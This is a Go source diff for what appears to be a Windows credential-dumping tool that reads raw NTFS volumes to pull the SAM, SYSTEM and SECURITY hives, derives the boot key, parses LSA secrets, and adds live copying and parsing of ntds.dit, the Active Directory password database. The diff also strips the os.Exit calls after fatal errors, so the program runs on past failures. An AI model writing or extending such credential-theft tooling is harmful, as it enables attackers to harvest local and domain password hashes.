@@ -6,7 +6,6 @@ import (
 	"runtime/debug"
 )
 
-// Credential structure to store complete user information
 type UserCredential struct {
 	Username string
 	Password string
@@ -15,7 +14,6 @@ type UserCredential struct {
 	Status   string
 }
 
-// Global variable to store extracted credentials
 var extractedCredentials map[string]*UserCredential
 
 func main() {
@@ -42,14 +40,12 @@ func main() {
 	volumeHandle, err := openVolume(volumePath)
 	if err != nil {
 		fmt.Println("\n[+] access denied: must run as administrator!")
-		os.Exit(1)
 	}
 	defer closeHandle(volumeHandle)
 
 	ntfs, err := readNTFSBoot(volumeHandle)
 	if err != nil {
 		fmt.Printf("[+] failed to read ntfs boot sector\n")
-		os.Exit(1)
 	}
 
 	fmt.Println("[+] reading registry hives from disk...")
@@ -59,7 +55,6 @@ func main() {
 
 	if samData == nil || systemData == nil {
 		fmt.Println("[+] failed to extract registry hives")
-		os.Exit(1)
 	}
 
 	fmt.Println("[+] parsing system hive...")
@@ -67,7 +62,6 @@ func main() {
 
 	if bootKey == nil {
 		fmt.Println("[+] failed to extract bootkey")
-		os.Exit(1)
 	}
 
 	fmt.Println("[+] parsing sam hive...")
@@ -80,5 +74,26 @@ func main() {
 		parseSECURITY(securityData, bootKey, domainName, isDomainJoined)
 	} else {
 		fmt.Println("[+] security hive not extracted, skipping lsa secrets")
+	}
+
+	ntdsPath := "ntds.dit"
+	if _, err := os.Stat(ntdsPath); os.IsNotExist(err) {
+		fmt.Println("\n[+] ntds.dit not found locally, attempting live extraction...")
+		extractedPath, err := createNTDSCopy()
+		if err != nil {
+			fmt.Printf("[!] failed to extract ntds.dit: %v\n", err)
+			fmt.Println("[!] skipping NTDS analysis (not a domain controller or insufficient privileges)")
+		} else {
+			ntdsPath = extractedPath
+			defer os.Remove(ntdsPath)
+		}
+	}
+
+	if _, err := os.Stat(ntdsPath); err == nil {
+		if bootKey != nil {
+			ParseNTDS(ntdsPath, bootKey)
+		} else {
+			fmt.Println("[!] cannot parse NTDS without bootkey")
+		}
 	}
 }
